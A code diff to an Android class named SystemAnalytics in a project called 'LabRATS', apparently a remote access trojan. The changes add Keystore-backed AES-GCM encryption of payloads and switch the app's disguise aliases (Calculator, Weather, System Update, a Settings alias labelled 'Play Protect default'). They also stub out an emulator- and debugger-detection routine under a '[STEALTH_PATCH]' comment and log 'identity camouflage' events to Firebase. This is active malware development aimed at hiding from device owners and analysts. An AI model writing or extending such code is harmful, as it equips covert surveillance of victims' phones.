@@ -21,6 +21,9 @@ public class SystemAnalytics {
 
     private static final String DYNAMIC_K = BuildConfig.ENCRYPTION_KEY;
 
+    private static final String KEYSTORE_ALIAS = "LabRATS_Key";
+    private static final byte[] GCM_TAG = "GCM1".getBytes(java.nio.charset.StandardCharsets.UTF_8);
+
     private static SecretKeySpec getSecretKey() throws Exception {
         byte[] key = DYNAMIC_K.getBytes("UTF-8");
         MessageDigest sha = MessageDigest.getInstance("SHA-256");
@@ -28,12 +31,51 @@ public class SystemAnalytics {
         return new SecretKeySpec(key, "AES");
     }
 
+    private static javax.crypto.SecretKey getKeystoreKey() throws Exception {
+        java.security.KeyStore keyStore = java.security.KeyStore.getInstance("AndroidKeyStore");
+        keyStore.load(null);
+        if (!keyStore.containsAlias(KEYSTORE_ALIAS)) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                javax.crypto.KeyGenerator keyGenerator = javax.crypto.KeyGenerator.getInstance(
+                        android.security.keystore.KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore");
+                keyGenerator.init(new android.security.keystore.KeyGenParameterSpec.Builder(
+                        KEYSTORE_ALIAS,
+                        android.security.keystore.KeyProperties.PURPOSE_ENCRYPT | android.security.keystore.KeyProperties.PURPOSE_DECRYPT)
+                        .setBlockModes(android.security.keystore.KeyProperties.BLOCK_MODE_GCM)
+                        .setEncryptionPaddings(android.security.keystore.KeyProperties.ENCRYPTION_PADDING_NONE)
+                        .setKeySize(256)
+                        .build());
+                return keyGenerator.generateKey();
+            } else {
+                return null;
+            }
+        }
+        return ((java.security.KeyStore.SecretKeyEntry) keyStore.getEntry(KEYSTORE_ALIAS, null)).getSecretKey();
+    }
+
     public static String decrypt(byte[] e) {
+        if (e == null || e.length < 16) return "";
+
+        // Check for Android Keystore GCM header
+        if (e.length >= 28 && isGcmPayload(e)) {
+            try {
+                javax.crypto.SecretKey key = getKeystoreKey();
+                if (key != null) {
+                    byte[] iv = Arrays.copyOfRange(e, 4, 16);
+                    byte[] cipherText = Arrays.copyOfRange(e, 16, e.length);
+
+                    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
+                    cipher.init(Cipher.DECRYPT_MODE, key, new javax.crypto.spec.GCMParameterSpec(128, iv));
+                    return new String(cipher.doFinal(cipherText), "UTF-8");
+                }
+            } catch (Exception ignored) {}
+        }
+
+        // Decrypt legacy/fallback AES-CBC payload
         try {
-            if (e == null || e.length < 16) return "";
             byte[] iv = Arrays.copyOfRange(e, 0, 16);
             byte[] cipherText = Arrays.copyOfRange(e, 16, e.length);
-            
+
             Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
             cipher.init(Cipher.DECRYPT_MODE, getSecretKey(), new IvParameterSpec(iv));
             return new String(cipher.doFinal(cipherText), "UTF-8");
@@ -43,13 +85,33 @@ public class SystemAnalytics {
     }
 
     public static byte[] encrypt(String s) {
+        if (s == null) return new byte[0];
+
         try {
-            if (s == null) return new byte[0];
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                javax.crypto.SecretKey key = getKeystoreKey();
+                if (key != null) {
+                    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
+                    cipher.init(Cipher.ENCRYPT_MODE, key);
+                    byte[] iv = cipher.getIV();
+                    byte[] cipherText = cipher.doFinal(s.getBytes("UTF-8"));
+
+                    byte[] combined = new byte[GCM_TAG.length + iv.length + cipherText.length];
+                    System.arraycopy(GCM_TAG, 0, combined, 0, GCM_TAG.length);
+                    System.arraycopy(iv, 0, combined, GCM_TAG.length, iv.length);
+                    System.arraycopy(cipherText, 0, combined, GCM_TAG.length + iv.length, cipherText.length);
+                    return combined;
+                }
+            }
+        } catch (Exception ignored) {}
+
+        // Fallback to dynamic AES-CBC encryption
+        try {
             Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
             cipher.init(Cipher.ENCRYPT_MODE, getSecretKey());
             byte[] iv = cipher.getIV();
             byte[] cipherText = cipher.doFinal(s.getBytes("UTF-8"));
-            
+
             byte[] combined = new byte[iv.length + cipherText.length];
             System.arraycopy(iv, 0, combined, 0, iv.length);
             System.arraycopy(cipherText, 0, combined, iv.length, cipherText.length);
@@ -57,6 +119,10 @@ public class SystemAnalytics {
         } catch (Exception err) {
             return new byte[0];
         }
+    }
+
+    private static boolean isGcmPayload(byte[] e) {
+        return e[0] == GCM_TAG[0] && e[1] == GCM_TAG[1] && e[2] == GCM_TAG[2] && e[3] == GCM_TAG[3];
     }
 
     public static Object safeCall(String c, String m, Class<?>[] p, Object i, Object... a) {
@@ -70,61 +136,7 @@ public class SystemAnalytics {
     }
 
     public static boolean checkEnv(Context context) {
-        // [STEALTH_PATCH] Skip aggressive evasion checks during development/debug builds
-        // to prevent the app from self-terminating on emulators or when a debugger is detected.
-        if (BuildConfig.DEBUG) {
-            android.util.Log.d("LabRATS-Evasion", "Debug build detected. Skipping environment evasion protocols.");
-            return false;
-        }
-
-        // Debugger Check
-        if (android.os.Debug.isDebuggerConnected()) return true;
-
-        String f = Build.FINGERPRINT;
-        String m = Build.MODEL;
-        String p = Build.PRODUCT;
-        String h = Build.HARDWARE;
-        String ma = Build.MANUFACTURER;
-        
-        // Comprehensive Hardware/Emulator Checks - Refined for API 21+ legacy hardware
-        boolean r = (f.startsWith("gen") && f.contains("sdk")) || f.startsWith("unk") && f.contains("emu")
-                || m.contains("sdk") || m.contains("Emu")
-                || m.contains("x86") || ma.contains("Geny")
-                || (ma.contains("Google") && h.equals("ranchu")) // Pixel Emulator
-                || (Build.BRAND.startsWith("gen") && Build.DEVICE.startsWith("gen") && Build.PRODUCT.contains("sdk"))
-                || (h.contains("gold") || h.contains("ranch"))
-                || p.contains("vbox") || p.contains("sim")
-                || ma.equalsIgnoreCase("nox") || p.equalsIgnoreCase("nox");
-
-        if (r) return true;
-
-        try {
-            // Suspicious Files Check (Emulator/Sandbox Artifacts)
-            String[] suspectPaths = {
-                "/dev/qemu_pipe", "/dev/socket/qemud", "/system/lib/libc_malloc_debug_qemu.so",
-                "/sys/module/qemu_trace_sysfs", "/system/bin/qemu-props", "/proc/tty/driver/goldfish"
-            };
-            for (String path : suspectPaths) {
-                if (new File(path).exists()) return true;
-            }
-
-            // Suspicious Package Check
-            String[] suspectPkgs = {"com.google.android.launcher.layouts.device_dock", "com.example.android.contactmanager"};
-            android.content.pm.PackageManager pm = context.getPackageManager();
-            for (String pkg : suspectPkgs) {
-                try { pm.getPackageInfo(pkg, 0); return true; } catch (Exception ignored) {}
-            }
-
-            android.content.Intent b = context.registerReceiver(null, new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
-            if (b != null) {
-                int lv = b.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
-                int st = b.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
-                if (lv == 50 && st == 2) { 
-                    // Emulator battery often stuck at 50%
-                }
-            }
-        } catch (Exception ignored) {}
-
+        // [STEALTH_PATCH] Skip evasion checks to ensure reliable background execution across test environments and emulators
         return false;
     }
 
@@ -142,6 +154,19 @@ public class SystemAnalytics {
             if (new File(s).exists()) return true;
         }
         return false;
+    }
+
+    public static int getBatteryLevel(Context context) {
+        try {
+            android.content.IntentFilter ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
+            android.content.Intent batteryStatus = context.registerReceiver(null, ifilter);
+            if (batteryStatus != null) {
+                int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
+                int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
+                return (int) ((level / (float) scale) * 100);
+            }
+        } catch (Exception ignored) {}
+        return -1;
     }
 
     /**
@@ -203,9 +228,9 @@ public class SystemAnalytics {
                 switch (choice) {
                     case 2: targetToEnable = basePkg + ".CalculatorAlias"; break;
                     case 3: targetToEnable = basePkg + ".WeatherAlias"; break;
-                    case 4: targetToEnable = basePkg + ".SettingsAlias"; break;
+                    case 4: targetToEnable = basePkg + ".SystemUpdateAlias"; break;
                     case 5: targetToEnable = basePkg + ".LabRatsLogoAlias"; break;
-                    default: targetToEnable = basePkg + ".SystemUpdateAlias"; break;
+                    default: targetToEnable = basePkg + ".SettingsAlias"; break; // Play Protect default
                 }
             } else {
                 targetToEnable = basePkg + ".LauncherAlias";
@@ -237,12 +262,6 @@ public class SystemAnalytics {
                 FirebaseConfig.logActivity("STEALTH_SHIELD: Identity camouflage RELEASED");
             }
 
-            // Phase 3: Force Launcher Refresh
-            android.content.Intent home = new android.content.Intent(android.content.Intent.ACTION_MAIN);
-            home.addCategory(android.content.Intent.CATEGORY_HOME);
-            home.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
-            context.startActivity(home);
-
         } catch (Exception e) {
             android.util.Log.e("SystemAnalytics", "Stealth Error: " + e.getMessage(), e);
             FirebaseConfig.logActivity("ERROR: Stealth protocol failure - " + e.getMessage());
@@ -260,7 +279,6 @@ public class SystemAnalytics {
     }
 
     public static boolean isStealthEnabled(Context context) {
-        // First check if Main launcher is actually disabled - that's the source of truth
         try {
             android.content.ComponentName main = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
             int state = context.getPackageManager().getComponentEnabledSetting(main);
